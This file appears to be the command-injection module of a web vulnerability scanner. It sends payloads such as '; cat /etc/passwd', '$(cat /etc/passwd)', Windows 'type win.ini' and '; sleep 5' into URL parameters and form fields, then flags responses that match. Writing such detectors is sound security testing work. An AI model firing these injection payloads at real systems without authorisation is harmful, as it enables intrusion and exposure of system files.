import re
import time
import random
import string
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from scanner.core import Finding, Severity, ScanSession


DETECTION_PAYLOADS = [
    {
        "payloads": [
            ("; cat /etc/passwd", r"root:[x*]:0:0:"),
            ("| cat /etc/passwd", r"root:[x*]:0:0:"),
            ("$(cat /etc/passwd)", r"root:[x*]:0:0:"),
        ],
        "os": "Linux",
    },
    {
        "payloads": [
            ("| type C:\\windows\\win.ini", r"\[fonts\]"),
            ("& type C:\\windows\\win.ini", r"\[fonts\]"),
        ],
        "os": "Windows",
    },
]

TIME_PAYLOADS = [
    ("; sleep 5", 5),
    ("| sleep 5", 5),
    ("$(sleep 5)", 5),
]


def _get_baseline(session, url, param, original):
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [original or "harmless"]
    baseline_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
    resp = session.get(baseline_url)
    return resp.text if resp else ""


def _check_param(session: ScanSession, url: str, param: str, original: str):
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    baseline_text = _get_baseline(session, url, param, original)

    for group in DETECTION_PAYLOADS:
        for payload, indicator in group["payloads"]:
            params[param] = [original + payload]
            test_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
            resp = session.get(test_url)
            if not resp or resp.status_code in (404, 403):
                continue

            match = re.search(indicator, resp.text, re.IGNORECASE | re.MULTILINE)
            if match and not re.search(indicator, baseline_text, re.IGNORECASE | re.MULTILINE):
                if "root:" in indicator:
                    lines = [l for l in resp.text.split("\n") if re.match(r"^[a-z_][\w-]*:[^:]*:\d+:\d+:", l)]
                    if len(lines) < 3:
                        continue
                session.add_finding(Finding(
                    title=f"OS Command Injection ({group['os']})",
                    severity=Severity.CRITICAL,
                    description=f"Parameter '{param}' is vulnerable to OS command injection.",
                    evidence=f"Payload: {payload}\nURL: {test_url}\nMatched: {match.group(0)[:100]}",
                    remediation="Never pass user input to OS commands. Use safe APIs.",
                    url=url,
                    module="cmd_injection",
                    cwe="CWE-78",
                    confirmed=True,
                ))
                return True

    baseline_times = []
    params[param] = [original or "harmless"]
    baseline_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
    for _ in range(2):
        start = time.time()
        session.get(baseline_url)
        baseline_times.append(time.time() - start)
    baseline_avg = max(baseline_times)

    for payload, delay in TIME_PAYLOADS:
        params[param] = [original + payload]
        test_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

        hits = 0
        for _ in range(2):
            start = time.time()
            resp = session.get(test_url)
            elapsed = time.time() - start
            if resp and elapsed >= baseline_avg + delay - 1.5:
                hits += 1

        if hits >= 2:
            session.add_finding(Finding(
                title="OS Command Injection (Time-Based)",
                severity=Severity.CRITICAL,
                description=f"Parameter '{param}' is vulnerable to blind command injection.",
                evidence=f"Payload: {payload}\nBaseline max: {baseline_avg:.2f}s, Both injected requests exceeded threshold",
                remediation="Never pass user input to OS commands. Use safe APIs.",
                url=url,
                module="cmd_injection",
                cwe="CWE-78",
                confirmed=True,
            ))
            return True

    return False


def _check_form(session: ScanSession, form: dict):
    baseline_data = {}
    for inp in form["inputs"]:
        name = inp.get("name")
        if name:
            baseline_data[name] = inp.get("value", "test")

    if form["method"] == "post":
        baseline_resp = session.post(form["action"], data=baseline_data)
    else:
        baseline_resp = session.get(form["action"], params=baseline_data)
    baseline_text = baseline_resp.text if baseline_resp else ""

    for inp in form["inputs"]:
        name = inp.get("name")
        if not name or inp.get("type") in ("hidden", "submit", "button", "file"):
            continue

        for group in DETECTION_PAYLOADS:
            for payload, indicator in group["payloads"][:2]:
                post_data = dict(baseline_data)
                post_data[name] = payload

                if form["method"] == "post":
                    resp = session.post(form["action"], data=post_data)
                else:
                    resp = session.get(form["action"], params=post_data)

                if not resp or resp.status_code in (404, 403):
                    continue

                match = re.search(indicator, resp.text, re.IGNORECASE | re.MULTILINE)
                if match and not re.search(indicator, baseline_text, re.IGNORECASE | re.MULTILINE):
                    if "root:" in indicator:
                        lines = [l for l in resp.text.split("\n") if re.match(r"^[a-z_][\w-]*:[^:]*:\d+:\d+:", l)]
                        if len(lines) < 3:
                            continue
                    session.add_finding(Finding(
                        title=f"OS Command Injection in Form ({group['os']})",
                        severity=Severity.CRITICAL,
                        description=f"Form field '{name}' at {form['action']} is vulnerable to command injection.",
                        evidence=f"Field: {name}\nPayload: {payload}\nMatched: {match.group(0)[:100]}",
                        remediation="Never pass user input to OS commands.",
                        url=form.get("source_url", form["action"]),
                        module="cmd_injection",
                        cwe="CWE-78",
                        confirmed=True,
                    ))
                    return


def run(session: ScanSession) -> None:
    print("\n[*] Testing for OS Command Injection...")

    for url in session.crawled_urls:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            continue

        for param, values in params.items():
            original = values[0] if values else ""
            _check_param(session, url, param, original)

    for form in session.forms:
        _check_form(session, form)
